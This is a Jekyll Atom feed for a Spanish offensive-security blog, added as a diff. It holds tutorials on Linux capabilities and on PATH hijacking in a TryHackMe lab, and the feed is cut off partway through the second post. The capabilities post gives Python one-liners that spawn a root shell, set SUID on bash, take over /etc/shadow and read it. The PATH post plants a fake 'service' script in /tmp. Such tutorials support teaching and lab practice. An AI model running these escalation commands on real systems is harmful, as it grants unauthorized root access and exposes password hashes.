@@ -1,0 +1,557 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-20T21:35:06+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Walxom Network</title><subtitle>Un blog de Seguridad Ofensiva, Hacking, y más cosas relacionadas con tecnología.</subtitle><author><name>Jose Salinas</name></author><entry><title type="html">Explotación de las Capabilities</title><link href="http://localhost:4000/privesc/explotacion-de-las-capabilities/" rel="alternate" type="text/html" title="Explotación de las Capabilities" /><published>2022-01-12T00:00:00+00:00</published><updated>2022-01-12T00:00:00+00:00</updated><id>http://localhost:4000/privesc/explotacion-de-las-capabilities</id><content type="html" xml:base="http://localhost:4000/privesc/explotacion-de-las-capabilities/">&lt;p&gt;Anteriormente, hablamos de los permisos SUID (setuid), te hago recordar esto porque quizás esto es algo parecido, pero no.&lt;/p&gt;
+
+&lt;p&gt;La diferencia entre estos es que si tenemos un binario con permisos SUID y ejecutas el binario, directamente asumes el rol del propietario de forma temporal. Pero si el binario tiene asignado una capabilitie, solo se le permite ejecutar ciertas acciones privilegiadas, más no asumir el rol del propietario.&lt;/p&gt;
+
+&lt;h2 id=&quot;qué-son-las-capabilities&quot;&gt;¿Qué son las capabilities?&lt;/h2&gt;
+
+&lt;p&gt;Las capabilities son atributos especiales en el kernel de Linux que otorgan privilegios específicos a procesos y programas que normalmente están reservados para procesos cuyo UID sea 0.&lt;/p&gt;
+
+&lt;p&gt;Lo bueno de las capabilities para un sysadmin es que con estas podemos dividir el poder de root, de modo que si se logra explotar un binario que tiene una o más capabilities, el daño que causara este será limitado, esto dependerá de las capabilities que le asignes.&lt;/p&gt;
+
+&lt;h2 id=&quot;capabilites-sets&quot;&gt;Capabilites Sets&lt;/h2&gt;
+
+&lt;p&gt;Cada subproceso tiene los siguientes conjuntos de capabilities que contienen cero o más:&lt;/p&gt;
+
+&lt;h3 id=&quot;capinh-inherited-capabilities-heredadas&quot;&gt;CapInh: Inherited capabilities (Heredadas)&lt;/h3&gt;
+
+&lt;p&gt;Con el Inherited (Heredado), se puede especificar todas las capabilities que se pueden heredar de un proceso principal.&lt;/p&gt;
+
+&lt;h3 id=&quot;capprm-permitted-capabilities-permitidas&quot;&gt;CapPrm: Permitted capabilities (Permitidas)&lt;/h3&gt;
+
+&lt;p&gt;Este es un superconjunto de capabilities que el subproceso puede agregar a los conjuntos de subprocesos permitidos o heredables.&lt;/p&gt;
+
+&lt;h3 id=&quot;capeff-effective-capabilities-efectivas&quot;&gt;CapEff: Effective capabilities (Efectivas)&lt;/h3&gt;
+
+&lt;p&gt;El CapEff representa todas las capabilities que el proceso está usando en este momento (este es el conjunto real de capabilities que el kernel usa para las comprobaciones de permisos).&lt;/p&gt;
+
+&lt;h3 id=&quot;capbnd-bounding-capabilities-delimitación&quot;&gt;CapBnd: Bounding capabilities (Delimitación)&lt;/h3&gt;
+
+&lt;p&gt;Con el Bounding (Delimitador), es posible restringir las capabilities que un proceso puede recibir.&lt;/p&gt;
+
+&lt;h3 id=&quot;capamb-ambient-capabilities-ambientales&quot;&gt;CapAmb: Ambient capabilities (Ambientales)&lt;/h3&gt;
+
+&lt;p&gt;La capabilitie Ambient (Ambientales) se aplica a todos los archivos binarios no SUID sin capabilities de archivo.&lt;/p&gt;
+
+&lt;h2 id=&quot;cómo-se-usan&quot;&gt;¿Cómo se usan?&lt;/h2&gt;
+
+&lt;p&gt;Hay varias capabilities para diferentes propósitos, esta es una lista de las más relevantes:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Capabilitie&lt;/th&gt;
+      &lt;th&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;strong&gt;CAP_SYS_TIME&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Configure el sistema y el reloj de hardware en tiempo real.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;strong&gt;CAP_KILL&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Evita comprobaciones de permisos para enviar señales.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;strong&gt;CAP_DAC_OVERRIDE&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Evita las revisiones de permisos sobre operaciones de lectura, escritura y ejecución.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;strong&gt;CAP_CHOWN&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Permite cambios arbitrarios en los IDs de usuario y de grupo los ficheros.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;strong&gt;CAP_NET_RAW&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Permite el uso de conectores de tipo RAW y PACKET.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Se puede asignar una capabilitie/s de las siguientes formas:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;setcap cap_setuid+ep /usr/bin/python3.9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;setcap cap_setuid,cap_chown+ep /usr/bin/python3.9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Podemos comprobar que capabilities tiene asignado el subproceso actualmente con: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep &quot;Cap&quot; /proc/&amp;lt;PID&amp;gt;/status&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Usuario &lt;strong&gt;normal&lt;/strong&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/Ksvk45F/User.png&quot; alt=&quot;User&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Usuario &lt;strong&gt;root&lt;/strong&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/7Rr4dzy/Root.png&quot; alt=&quot;Root&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;Nota:&lt;/strong&gt; El &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$$&lt;/code&gt; contiene el PID de la shell que estamos ejecutando.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Veremos números hexadecimales que con la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;capsh&lt;/code&gt;, podemos decodificarlos para obtener los nombres de las capabilities asignadas:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/0Z51R7V/capsh.png&quot; alt=&quot;capsh&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;También hay otra manera más fácil con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getpcaps &amp;lt;PID&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/MPBDRRj/getpcaps.png&quot; alt=&quot;getpcaps&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Encontrar capabilities asignadas de forma recursiva desde la raíz:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;getcap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; / 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mostrar las capabilities asignadas en un archivo en específico:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;getcap /usr/bin/python3.9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Podemos remover las capabilities asignadas a un archivo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;setcap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; /usr/bin/python3.9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;privesc--capabilities&quot;&gt;PrivEsc / Capabilities&lt;/h2&gt;
+
+&lt;p&gt;Existe una lista muy larga de las capabilities que existen hoy en día, pero hay algunas en específicas que si le asignas a determinados programas puedes escalar privilegios de forma completa y obtener un shell como usuario root.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;Nota:&lt;/strong&gt; Estas capabilities solo fueron asignadas a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3.9&lt;/code&gt; para que se les sea fácil entender, pero que quede en claro que este no es el único comando que se puede explotar.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;cap_setuid&quot;&gt;CAP_SETUID&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3.9 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;cap_fowner&quot;&gt;CAP_FOWNER&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3.9 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import os; os.chmod(&quot;/bin/bash&quot;,40001)&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;cap_chown&quot;&gt;CAP_CHOWN&lt;/h3&gt;
+
+&lt;p&gt;Podemos asignarnos como propietario del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3.9 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import os; os.chown(&quot;/etc/shadow&quot;,1000,1000)&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si grepeamos por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ENCRYPT&lt;/code&gt; en fichero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/login.defs&lt;/code&gt;, podemos ver que método de encriptado usa:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/JykvKhN/login-defs.png&quot; alt=&quot;login.defs&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;para así generar una nueva contraseña con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl&lt;/code&gt; y su encriptado correspondiente y remplazarlo para el usuario root. Puedes solicitar ayuda con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl passwd --help&lt;/code&gt; para crear el tipo de hash para la contraseña.&lt;/p&gt;
+
+&lt;p&gt;Ejemplo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl passwd &lt;span class=&quot;nt&quot;&gt;-6&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;cap_dac_read_search&quot;&gt;CAP_DAC_READ_SEARCH&lt;/h3&gt;
+
+&lt;p&gt;Con esta capabilitie podemos leer cualquier archivo, en especial el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; :&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3.9 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print(open(&quot;/etc/shadow&quot;,&quot;r&quot;).read())&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Estas solo fueron algunas, en la página de &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; puedes encontrar más comandos que puedes explotar con diferentes capabilities.&lt;/p&gt;</content><author><name>Jose Salinas</name></author><category term="PrivEsc" /><category term="linux" /><category term="privesc" /><category term="capabilities" /><summary type="html">Anteriormente, hablamos de los permisos SUID (setuid), te hago recordar esto porque quizás esto es algo parecido, pero no.</summary></entry><entry><title type="html">Explotación de un PATH Hijacking</title><link href="http://localhost:4000/privesc/explotacion-de-un-path-hijacking/" rel="alternate" type="text/html" title="Explotación de un PATH Hijacking" /><published>2022-01-01T00:00:00+00:00</published><updated>2022-01-01T00:00:00+00:00</updated><id>http://localhost:4000/privesc/explotacion-de-un-path-hijacking</id><content type="html" xml:base="http://localhost:4000/privesc/explotacion-de-un-path-hijacking/">&lt;p&gt;En los sistemas operativos hay un concepto llamado las variables de entorno, quizás algunos ya hayamos usado estos sin darnos cuenta, ya sea &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%AppData%&lt;/code&gt; para encontrar el directorio donde poner los mods de Minecraft o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%Temp%&lt;/code&gt; para borrar los archivos temporales (si eres de Microsoft).&lt;/p&gt;
+
+&lt;p&gt;Las variables de entorno son valores dinámicos que afectan a los programas o procesos que se ejecutan en un sistema operativo. Estas se pueden, modificar, guardar y eliminar.&lt;/p&gt;
+
+&lt;p&gt;En Linux puedes ver la lista completa de variables de entorno de muchas formas, pero las más utilizadas son con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;env&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printenv&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/ZKtDH90/1.png&quot; alt=&quot;env&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;variables-de-entorno-comunes-en-linux&quot;&gt;Variables de entorno comunes en Linux&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Variable&lt;/th&gt;
+      &lt;th&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;PATH&lt;/td&gt;
+      &lt;td&gt;contiene una lista ordenada de rutas donde se buscaran ejecutables.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;HOME&lt;/td&gt;
+      &lt;td&gt;contiene el directorio de inicio del usuario actual.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;SHELL&lt;/td&gt;
+      &lt;td&gt;contiene el nombre de la shell interactiva que se está ejecutando actualmente.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;TERM&lt;/td&gt;
+      &lt;td&gt;contiene el nombre de la terminal que se está ejecutando.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;HOSTNAME&lt;/td&gt;
+      &lt;td&gt;contiene el nombre de host del sistema.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;USER&lt;/td&gt;
+      &lt;td&gt;contiene el nombre del usuario actual.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;PWD&lt;/td&gt;
+      &lt;td&gt;contiene la ruta al directorio de trabajo actual.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;LANG&lt;/td&gt;
+      &lt;td&gt;contiene el idioma por defecto del sistema.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;RANDOM&lt;/td&gt;
+      &lt;td&gt;contiene un valor de número aleatorio.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;PS1&lt;/td&gt;
+      &lt;td&gt;contiene el prompt actual.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Para mí la manera más fácil de imprimir el contenido de una variable en específica es con: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo $&amp;lt;VARNAME&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;pero también existe otra forma como con:  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printenv &amp;lt;VARNAME&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;printenv &lt;/span&gt;PATH
+
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;hay muchos más comandos que te pueden imprimir las variables de entorno, pero estos dos son los más comunes e usados.&lt;/p&gt;
+
+&lt;h2 id=&quot;crear-o-modificar-una-variable-de-entorno-en-linux&quot;&gt;Crear o modificar una variable de entorno en Linux&lt;/h2&gt;
+
+&lt;p&gt;El comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export&lt;/code&gt; sirve para exportar variables a procesos secundarios. La sintaxis básica de este comando se vería así: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export &amp;lt;VARNAME&amp;gt;=&amp;lt;value&amp;gt;&lt;/code&gt;. Se puede modificar una variable de entorno de la siguiente manera:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~$ export TERM=xterm
+user@debian:~$ echo $TERM
+xterm
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para crear sería lo mismo que modificar una variable de entorno nueva.&lt;/p&gt;
+
+&lt;h2 id=&quot;eliminar-una-variable-de-entorno-en-linux&quot;&gt;Eliminar una variable de entorno en Linux&lt;/h2&gt;
+
+&lt;p&gt;Se puede eliminar una variable de entorno con en Linux con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unset&lt;/code&gt;, de la siguiente manera:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;unset &lt;/span&gt;PATH
+user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya habiendo aprendido un poco sobre las variables de entorno, puedo explicar como se puede llegar a escalar privilegios con estas, en especial con una.&lt;/p&gt;
+
+&lt;h2 id=&quot;variable-de-entorno-path-en-linux&quot;&gt;Variable de entorno PATH en Linux&lt;/h2&gt;
+
+&lt;p&gt;Se usa para ubicar comandos o ficheros binarios dentro de la jerarquía de directorios. El &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH&lt;/code&gt; normalmente se crea en un conjunto de directorios fijos donde el sistema siempre buscara comandos que un usuario escriba. Estas tienen orden de prioridad que empieza desde la derecha hasta la izquierda.&lt;/p&gt;
+
+&lt;h2 id=&quot;ruta-absoluta-y-relativa&quot;&gt;Ruta absoluta y relativa&lt;/h2&gt;
+
+&lt;p&gt;Esto son dos conceptos básicos que debemos de saber para entender como funciona este ataque.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;La ruta absoluta:&lt;/strong&gt; siempre contiene el elemento raíz y la lista completa de directorios necesaria para ubicar el archivo.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;La ruta relativa:&lt;/strong&gt; debe combinarse con otra ruta para acceder a un archivo. Por ejemplo, Downloads/Firefox es una ruta relativa.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;qué-es-el-path-hijacking&quot;&gt;¿Qué es el Path Hijacking?&lt;/h2&gt;
+
+&lt;p&gt;Como su propio nombre indica Path Hijacking (Secuestro de rutas), este ataque consiste en secuestrar las rutas habituales definidas por la variable de entorno PATH, donde en vez de buscar los comandos por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/bin:/usr/bin:/bin&lt;/code&gt;, nosotros podemos decirle en donde buscar. Esto en un fichero binario que contenga el permiso SUID asignado, puede ser muy peligroso.&lt;/p&gt;
+
+&lt;h2 id=&quot;privesc--path-hijacking&quot;&gt;PrivEsc / Path Hijacking&lt;/h2&gt;
+
+&lt;p&gt;Para demostrar y poner en práctica esta técnica, voy a escoger un ejercicio del módulo &lt;a href=&quot;https://tryhackme.com/room/linuxprivesc&quot;&gt;Linux PrivEsc&lt;/a&gt; de la plataforma &lt;a href=&quot;https://tryhackme.com/&quot;&gt;TryHackMe&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/Gt0FkZC/linux-privesc.png&quot; alt=&quot;Tasks&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;suid--sgid-executables---environment-variables&quot;&gt;SUID / SGID Executables - Environment Variables&lt;/h3&gt;
+
+&lt;p&gt;Para empezar vamos a ver que contiene el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH&lt;/code&gt; y su orden de prioridad de las rutas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/cKqgYkQ/2.png&quot; alt=&quot;printenv&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No vemos nada raro, son las rutas habituales de un sistema operativo GNU/Linux. El laboratorio nos dice que tiene un archivo binario llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;suid-env&lt;/code&gt; en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/bin/&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/qkLZBHc/3.png&quot; alt=&quot;suid-env&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;si le pasamos el archivo ejecutable al comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt;, este nos permitirá ver los caracteres legibles para nosotros dentro de cualquier archivo:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/RQwsFMz/4.png&quot; alt=&quot;strings&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como podemos ver esta ejecutando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;service apache2 start&lt;/code&gt;, y no está especificando la ruta absoluta del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;service&lt;/code&gt;, y por ende significa que está usando el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH&lt;/code&gt; para encontrar el comando. Vemos también que el ejecutable tiene asignado el permiso SUID y su propietario es root.&lt;/p&gt;
+
+&lt;p&gt;Lo que haremos será remplazar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;service&lt;/code&gt; para que en vez que inicie un servicio, le asigne el permiso SUID a la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Nos metemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; y con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt; creamos un archivo que se llame &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;service&lt;/code&gt;, dentro de el voy a poner &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod u+s /bin/bash&lt;/code&gt; para que le asigne el permiso SUID a la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt;, este es el archivo que remplazara al comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;service&lt;/code&gt; de la ruta de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt;. Para finalizar le asignaremos el permiso de ejecución al “nuevo comando” con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +x service&lt;/code&gt; :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/d0gH0LQ/5.png&quot; alt=&quot;service&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya teniendo el “nuevo comando” listo, podemos agregarle una nueva ruta a nuestro PATH y ponerla como primera en la orden de prioridad. En este caso como yo tengo el nuevo comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;service&lt;/code&gt; en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;, lo exportaré como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export PATH=/tmp:$PATH&lt;/code&gt;:&lt;/p&gt;
+
